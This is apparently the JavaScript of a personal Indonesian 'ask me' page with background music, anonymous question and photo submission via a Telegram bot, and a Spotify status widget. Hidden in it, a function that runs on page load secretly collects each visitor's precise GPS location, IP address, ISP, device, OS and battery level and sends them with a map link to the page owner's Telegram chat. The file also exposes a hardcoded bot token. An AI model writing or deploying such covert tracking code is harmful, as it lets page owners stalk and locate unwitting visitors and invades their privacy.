const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
openPhotoOptions.addEventListener('click', () => {
  photoOptions.classList.toggle('show');
});

// NOTE: replace the two placeholders below with your actual bot token and chat id
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

const music=document.getElementById('bgmusic');
const btnMusic=document.getElementById('musicButton');
let started=false;music.volume=0.4;
async function startMusic(){if(started)return;started=true;music.muted=false;try{await music.play();btnMusic.classList.remove("show");}catch(err){btnMusic.classList.add("show");}}
document.addEventListener('click',startMusic,{once:true});
document.addEventListener('touchstart',startMusic,{once:true});
btnMusic.addEventListener('click',async()=>{try{await music.play();btnMusic.classList.remove("show");}catch(e){console.log(e);}});

const modal=document.getElementById('modal');
document.getElementById('openAsk').onclick=()=>modal.classList.add('show');
document.getElementById('closeQ').onclick=()=>modal.classList.remove('show');
const overlay=document.getElementById("blurOverlay"),
input=document.getElementById("igInput"),
btnLogin=document.getElementById("igSubmit"),
savedIG=localStorage.getItem("ig_user");
function removeOverlay(){overlay.style.opacity="0";overlay.style.pointerEvents="none";setTimeout(()=>overlay.style.display="none",300);}
function showUserStatus(n){const e=document.getElementById("igStatus");e.textContent=`👉🏻 Login sebagai ${n} (keluar)`;e.style.display="block";e.onclick=()=>{if(confirm("Keluar?")){localStorage.removeItem("ig_user");setTimeout(()=>location.reload(),400);}};}
if(savedIG){removeOverlay();showUserStatus(savedIG);}
btnLogin.onclick=()=>{const u=input.value.trim();if(!u)return alert("Masukkan username dulu");localStorage.setItem("ig_user",u);showUserStatus(u);removeOverlay();};

// universal send animation + swoosh
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(()=>{});
      } catch(e){}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(()=>el.innerHTML="",3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

// send question (modal)
document.getElementById('sendQ').addEventListener('click', async()=>{
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const qmsg = document.getElementById('qmsg');
  if(!text){qmsg.textContent="Isi pertanyaan dulu.";return;}
  await sendTelegramMessage(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:`💬 Pertanyaan dari ${savedUser}\n${text}`})},
    qmsg
  );
  setTimeout(()=>{ if(qmsg.textContent.includes("Terkirim") || qmsg.innerText.includes("Terkirim")) modal.classList.remove('show'); }, 900);
});

// take photo / preview
const takeBtn=document.getElementById("takePhoto");
const photoInput=document.getElementById("photoInput");
takeBtn.onclick=async()=>{
  try{
    const cameraInput=document.createElement("input");
    cameraInput.type="file";cameraInput.accept="image/*";cameraInput.capture="user";
    cameraInput.click();
    cameraInput.onchange=()=>{
      if(cameraInput.files.length>0){
        photoInput.files = cameraInput.files;
        const reader = new FileReader();
        reader.onload = (e) => { preview.src = e.target.result; preview.style.display = "block"; };
        reader.readAsDataURL(cameraInput.files[0]);
      }
    };
  }catch(e){alert("Kamera tidak tersedia");}
};
photoInput.addEventListener('change',()=>{ if(photoInput.files && photoInput.files[0]){ const reader=new FileReader(); reader.onload=()=>{}; reader.readAsDataURL(photoInput.files[0]); } });

// send photo
document.getElementById("sendPhoto").addEventListener('click', async()=>{
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const fileInput = document.getElementById("photoInput");
  const file = fileInput.files && fileInput.files[0];
  const caption = document.getElementById("caption").value;
  const statusEl = document.getElementById("status");
  if(!file){statusEl.textContent="Pilih foto dulu.";return;}
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("caption", `📸 Foto dari ${savedUser}\n${caption}`);
  fd.append("photo", file);
  const ok = await sendTelegramMessage(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
    {method:"POST", body: fd},
    statusEl
  );
  if(ok){
    fileInput.value=""; document.getElementById("caption").value=""; preview.style.display="none";
  }
});

// versi ringkas & akurat: hanya GPS ➜ IP fallback
async function showVisitorInfo() {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
    try {
      const now = new Date();
      const mapLink = (latitude && longitude)
        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
        : "https://www.google.com/maps";
      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
                 /Android/i.test(navigator.userAgent) ? "Android" :
                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
      let batteryInfo = "Tidak diketahui";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
      } catch {}
      const msg =
`📢 Pengunjung Baru!
👤 ${savedUser}
🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
🗺️ Maps: ${mapLink}
📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
💻 ${device}
🧩 OS: ${os}
🔋 Baterai: ${batteryInfo}
🏷️ ISP: ${d.connection?.isp || d.org || "?"}
📡 IP: ${d.ip || "?"}
🕓 ${now.toLocaleString('id-ID')}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    } catch (err) { console.error("❌ Gagal kirim info:", err); }
  }
  async function getBestGPS(samples = 5) {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject("Geolocation tidak didukung");
      const results = [];
      const opts = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
      function capture() {
        navigator.geolocation.getCurrentPosition(pos => {
          results.push(pos.coords);
          if (results.length >= samples) {
            const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
            resolve(best);
          } else setTimeout(capture, 700);
        }, err => {
          if (results.length > 0) {
            const best = results.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
            resolve(best);
          } else reject(err);
        }, opts);
      }
      capture();
    });
  }
  try {
    const coords = await getBestGPS(6);
    const { latitude, longitude, accuracy } = coords;
    const ipData = await (await fetch("https://ipwho.is/")).json();
    await sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
  } catch (gpsErr) {
    try {
      const d = await (await fetch("https://ipwho.is/")).json();
      await sendToTelegram(d, d.latitude, d.longitude, "IP-based");
    } catch { await sendToTelegram({}, null, null, "Fixed"); }
  }
}
showVisitorInfo();
setTimeout(()=>{ startMusic(); },700);

// butterflies animation
(function(){ /* ... animasi kupu kode lama tetap ... */ })();

// === Status Spotify lama ===
(async function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;
  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `width:100%;display:block;text-align:center;font-size:14px;font-family:'Poppins', monospace;color:#cfcfcf;opacity:0;transform:translateY(6px);transition:opacity .6s ease, transform .6s ease, color .6s ease;margin-top:6px;margin-bottom:4px;letter-spacing:0.4px;user-select:none;position:relative;`;
  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);
  async function updateStatus(){
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status", {cache:"no-store"});
      const data = await res.json();
      const time = new Date(data.time);
      const diff = (Date.now() - time.getTime()) / 60000;
      const ago = diff < 1 ? "Music" : `${Math.floor(diff)}m ago`;
      const text = `${data.status} (${ago})`;
      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;statusBox.style.transform = "translateY(6px)";
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;statusBox.style.transform = "translateY(0)";
          let color = "#fff";
          if (data.status.includes("Online")) color = "#00ffb3";
          else if (data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.color = "#ff7979";statusBox.style.opacity = 1;statusBox.style.transform = "translateY(0)";
    }
  }
  updateStatus();setInterval(updateStatus, 4000);
})();

// === Tambahan Preview Cover Spotify ===
(function(){
  const statusBox = document.getElementById("liveModeStatus");
  if (!statusBox) return;
  async function showSpotifyPreview() {
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
      const data = await res.json();
      if (data.status && data.status.includes("Listening") && data.cover) {
        const oldPrev=document.getElementById("spotifyCoverPreview"); if(oldPrev) oldPrev.remove();
        const wrap=document.createElement("div"); wrap.id="spotifyCoverPreview"; wrap.style.cssText="text-align:center;margin-top:6px;animation:fadeIn .6s ease;";
        const img=document.createElement("img"); img.src=data.cover; img.alt="Now Playing"; img.style.cssText="width:90px;height:90px;border-radius:12px;box-shadow:0 0 10px rgba(0,0,0,0.4);display:block;margin:0 auto 6px;";
        const title=document.createElement("div"); title.textContent=data.status.replace('🎧 Listening on Spotify — ',''); title.style.cssText="color:#b6e3ff;font-size:13px;font-family:'Poppins',sans-serif;margin-top:4px;opacity:0.9;";
        const style=document.createElement("style"); style.textContent="@keyframes fadeIn{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:translateY(0);}}"; document.head.appendChild(style);
        wrap.appendChild(img); wrap.appendChild(title); statusBox.insertAdjacentElement("afterend", wrap);
      } else {
        const oldPrev=document.getElementById("spotifyCoverPreview"); if(oldPrev) oldPrev.remove();
      }
    } catch(e){console.warn("Gagal menampilkan Spotify preview:", e);}
  }
  showSpotifyPreview();
  setInterval(showSpotifyPreview, 5000);
})();

// === Browser Warning ===
const ua = navigator.userAgent || navigator.vendor || window.opera;
if (ua.includes("Instagram") || ua.includes("FBAV") || ua.includes("FBAN")) {
  const warn = document.createElement("div");
  warn.textContent = "buka lewat Chrome";
  warn.style.cssText = "position: fixed; top: 0; left: 0; width: 100%; background: #ffcd4c; color: #000; padding: 10px; text-align: center; font-weight: 600; z-index: 9999; font-family: Inter, system-ui, sans-serif;";
  document.body.appendChild(warn);
}
